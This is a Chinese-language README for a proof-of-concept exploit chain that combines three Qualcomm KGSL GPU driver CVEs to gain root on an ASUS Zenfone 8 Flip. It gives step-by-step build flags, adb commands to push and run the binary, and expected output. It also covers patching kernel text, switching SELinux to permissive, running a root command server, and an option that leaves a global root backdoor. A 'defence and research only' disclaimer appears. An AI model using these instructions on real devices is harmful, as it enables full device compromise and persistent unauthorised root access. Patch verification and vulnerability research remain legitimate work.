# PoC：KGSL 實體頁 UAF 提權鏈

## 這是什麼

`kgsl_23373_poc.c` 是針對 ASUS Zenfone 8 Flip（ZS672KS / ASUS_I004D，SM8350、Adreno 660、kernel `5.4.210-qgki-perf`、Android 13）的完整本地提權 PoC。它把三個缺陷串成一次利用：

- **CVE-2023-33107**：SVM 範圍檢查的 `gpuaddr + size` 回繞，讓重疊映射通過 rbtree 檢查。
- **CVE-2024-21468**：`arm_lpae_map_sg()` 的 fast path 丟棄 `-EEXIST`，失敗回滾清掉既有 PTE。
- **CVE-2024-23373**：unmap 失敗後仍清除 `MAPPED` 並釋放 backing pages，留下懸空 SMMU PTE。

取得 UAF 後，PoC 用殘留 PTE 當 GPU 讀寫通道，把已釋放的頁回收成可辨識的 `kgsl_mem_entry`，改寫其中一個 `memdesc` 的 `ops`、`size`、`physaddr`，讓一次 `mmap()` 變成 3 GiB 的實體記憶體視窗。最後改寫 `__arm64_sys_pkey_alloc` stub，以 `syscall(289)` 執行 `override_creds(&init_cred)`，取得 uid 0，再 fork 一個 root server。

**用途限制。** 僅供防禦、偵測、修補驗證與學術研究。只能在你有明確權限的裝置上執行；請預期裝置凍結、重開機或資料遺失。

## 建置

需求：`aarch64-linux-gnu-gcc-12`（static glibc）、`make` 不需要。`build.sh` 是建置權威；不要手抄編譯命令。

```sh
./build.sh                 # 產出 kgsl_23373_poc_main
./build.sh my_poc          # 指定輸出檔名
```

`build.sh` 會做的事：

```sh
aarch64-linux-gnu-gcc-12 -O2 -static \
    -DV7_ENABLE_TRIGGER=1 -DV7_ENABLE_PRIV_WRITE=1 \
    -DV7_ENABLE_RELEASE_EXIT=${RELEASE_EXIT:-0} \
    -DROSCAN_WAIT_RETIRE=${ROSCAN_WAIT_RETIRE:-1} \
    -o <out> kgsl_23373_poc.c -lpthread -ldl
```

## 四個 `-D` 旗標

| 旗標 | 預設 | 作用 | 設錯的後果 |
|---|---|---|---|
| `V7_ENABLE_TRIGGER` | 0 | 啟用觸發與鏈路徑。 | 0：印出 `trigger path disabled in this build` 後 `return 2`，鏈不會執行。 |
| `V7_ENABLE_PRIV_WRITE` | 0 | 啟用 SELinux／credential 寫入階段。 | 0：仍可觸發並讀實體記憶體；實體映射成功後印一行、`munmap`、`continue` 下一次嘗試；嘗試耗盡後落到 `uaf_pause()` 永久停泊。外觀與「鏈卡住」難以區分。 |
| `V7_ENABLE_RELEASE_EXIT` | 0 | 1 時移除 `[REL] disabled` 的 early return，啟用 `RELEASE_EXIT` 一個動詞；其餘 `RELEASE_*` 不受這個旗標影響。 | 0 時這個動詞印 `[REL] disabled in this build` 並返回。1 會改變 binary 位元組與 UAF 現場，不要用這個產物量出貨成功率。 |
| `ROSCAN_WAIT_RETIRE` | 1 | 控制掃描的 submit 與讀回之間是否有同步點（原始碼 `:3234-3239` 定義，`:3328` 使用）。設為 0 會關掉掃描的同步點，讓掃描結果不穩定。 | `ROSCAN_WAIT_RETIRE=0 ./build.sh` 產生不同的 binary（實測 md5 由 `216fdf917ea3243b6048c9635f29ce21` 變為 `579012b494036ec5c516c1038119e228`）。重現出貨行為請保持預設 1。 |

`RELEASE_EXIT=1` 與 `ROSCAN_WAIT_RETIRE=0` 都可用環境變數覆寫；後者會改變掃描的同步行為（見上表）。

編譯器預設是 `aarch64-linux-gnu-gcc-12`。用 `POC_CC` 指定別的版本；版本不是 12.4.0 時 `build.sh` 會中止，要它照做就設 `POC_ALLOW_ANY_CC=1`，此時 md5 與 README 記的值不同。

```sh
RELEASE_EXIT=1 ./build.sh kgsl_23373_poc_release
```

釋放序列由獨立動詞組成，分兩個命令通道送出：

| 命令 | 通道 | 執行者 |
|---|---|---|
| `STOP_HB`、`RESTORE_STUB`、`RELEASE_MAIN` | `/data/local/tmp/wdcmd` | main（停泊中） |
| `RELEASE_DUMP`、`RELEASE_HEAL_HITS`、`RELEASE_HEAL_VICTIM`、`RELEASE_FREE <start> <count>`、`RELEASE_KILLFAM`、`RELEASE_EXIT` | `/data/local/tmp/rootcmd` | root server |

順序：`STOP_HB` → `RELEASE_DUMP` → `RELEASE_HEAL_HITS` → `RELEASE_HEAL_VICTIM` →
`RELEASE_FREE`（每批 2048，直到清單跑完）→ `RESTORE_STUB` → `RELEASE_KILLFAM` →
`RELEASE_MAIN` → `RELEASE_EXIT`。

`STOP_HB` 要先送：`FREE` 在 GPU 還活躍時死亡率很高。`RELEASE_EXIT` 只結束 server；
`f_count` 要等 main 也退出才歸零，所以 `RELEASE_MAIN` 在它之前。
heal 完成後 teardown 會正常跑完；未 heal 的 entry 會讓它走過懸空 PTE 並硬凍結。

## 驗證產物

`build.sh` 會做兩項字串斷言；任一命中就回報建置錯誤：

```sh
strings <out> | grep -q "trigger path disabled"            # 必須不命中
strings <out> | grep -q "privilege-write stage disabled"   # 必須不命中
```

成功時它會印出一行 `built:`（檔案大小、md5），接著三行分別是 `gcc` 版本、`RELEASE_EXIT` 的值與原始碼 md5。`build.sh` 檔頭註解裡的 source line 數字是舊版的，旗標名稱與行為以本文件與原始碼為準。建議另外確認：

```sh
file kgsl_23373_poc_main          # 期望：ELF 64-bit LSB executable, ARM aarch64, statically linked
readelf -s kgsl_23373_poc_main | grep FILE   # 應看到 kgsl_23373_poc.c
```

原始碼檔名會以 STT_FILE symbol 進 binary，改名再編會改變 md5。部署後在 host 與 device 各算一次 md5，兩端一致才啟動。

## 執行

```sh
adb push kgsl_23373_poc_main /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/kgsl_23373_poc_main"
adb shell "/data/local/tmp/kgsl_23373_poc_main 256 192 20000 root"
```

參數：`argv[1]` 必須是 256（其他值會大聲拒絕並 `return 1`）；`argv[2]` 被接受但不使用（launcher 慣例傳 192）；`argv[3]` 是每次競態的 mmap 嘗試上限（預設 20000）；`argv[4]` 是模式。

環境變數（存在才算，不看值，`0` 也算存在）：

| 變數 | 作用 |
|---|---|
| `PKEY_HIJACK_ONLY` | 走快路徑：跳過 800 個 parked 子行程與 `task_struct` 掃描，直接 patch pkey stub |
| `LEGACY_BLIND_WRITE` | 走 ROSCAN 之前的盲寫路徑，只用於 A/B 對照 |
| `BLIND_WRITE_AFTER_ROOT` | root 確認後再污染一次視窗，A/B 對照用 |
| `POC_KEEP_STUB` | 保留被改寫的 pkey stub。**設了就是全域 root 後門**，只在除錯時用 |
| `POC_LOG_FILE` | 把 log 另寫一份到指定路徑 |

模式字串：

- `root`：出貨路徑。
- `selftest`：不做 UAF 的自檢。
- `raceonly`：只跑到競態。
- `slidetest`：命中候選的讀回驗證。
- `oobprobe`：越界讀原型；`PANIC_ON_OOPS` 下可能直接重啟。

其餘模式是診斷用途，行為見原始碼。

## 預期輸出

開頭會看到：

```
ALIVE-MAIN
[CFG] TRIGGER=1 PRIV_WRITE=1 ...
[ENV] ...
```

觸發階段：

```
[+] A: id=... gpuaddr=0x7001ff000 (HOSTPTR=0x7001ff000)
[D] race attempt 1 done: ok=... enodev=... ebusy=... eother=...
[+] discriminator: re-import failed errno=12 (Cannot allocate memory); the SVM region was kept = unmap failure confirmed -> UAF established!
[+] dangling: [0x700200000, 0x710203000) (65539 pages); SMMU PTEs left behind
```

之後是噴射、掃描與候選驗證。成功時會出現 `VERDICT=PASS`、`rooted fastpath` 或 `ROOT-CONFIRMED` 這類字串（實際字串見原始碼），並印出 root server 的 pid。root server 的命令通道是 `/data/local/tmp/rootcmd`：

```sh
adb shell "echo 'id' >> /data/local/tmp/rootcmd"
adb shell "cat /data/local/tmp/rootout"
```

失敗或未達 root 時，行程停在 `uaf_pause()`，log 可能停在任意一行。日誌行可能被丟掉（`../docs/03-limitations.md` §1.4）。因此日誌「有」可以當證據，「沒有」不能當反證；可靠的判據是對命令通道投一條命令並看到 `uid=0` 的回應。

## 執行前必須知道

- **會改動裝置狀態。** PoC 會建立 UAF、改寫核心 text、把 SELinux 設成 permissive、留下 root server。只有重開機才會復原；root 是 per-boot，不是持久化 root。
- **UAF 建立後不能退出。** 退出或關閉 kgsl fd 會觸發 SMMU teardown，裝置可能硬凍結或重啟。失敗路徑都會停在 `uaf_pause()`。
- **只允許單一實例。** `/data/local/tmp/poc.lock` 是 `O_CREAT|O_EXCL` 鎖；啟動前由 launcher 移除。手動重跑前先確認沒有殘留行程。
- **需要記憶體。** 噴射可達數萬個 GPU 物件，加上 pipe／socket 的 UNMOVABLE 壓力；`MemAvailable` 低於 500 MB 時 PoC 會主動停泊。
- **需要乾淨開機與時間。** 開機後至少等 60 秒；一次完整嘗試通常數十秒到數分鐘，且要避開裝置的電池量測窗口。

## 相關文件

- `../docs/02-exploit-chain.md`：七步利用流程與前置條件。
- `../docs/03-limitations.md`：建置、可重現性、設計註記與失敗模式。
